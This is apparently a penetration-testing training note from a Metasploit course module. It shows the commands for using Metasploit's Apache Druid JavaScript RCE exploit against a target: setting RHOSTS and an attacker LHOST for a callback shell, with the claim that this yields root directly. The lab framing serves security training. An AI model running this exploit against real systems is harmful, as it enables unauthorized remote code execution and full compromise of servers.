# Module 39 — Using The Metasploit Framework
## Section 6: Payloads

**Target:** Apache Druid instance.

## Approach
```
use exploit/linux/http/apache_druid_js_rce
set RHOSTS <target>
set LHOST <your-tun0-ip>
exploit
```
Apache Druid's JS RCE gives a root shell directly — no privesc step needed.
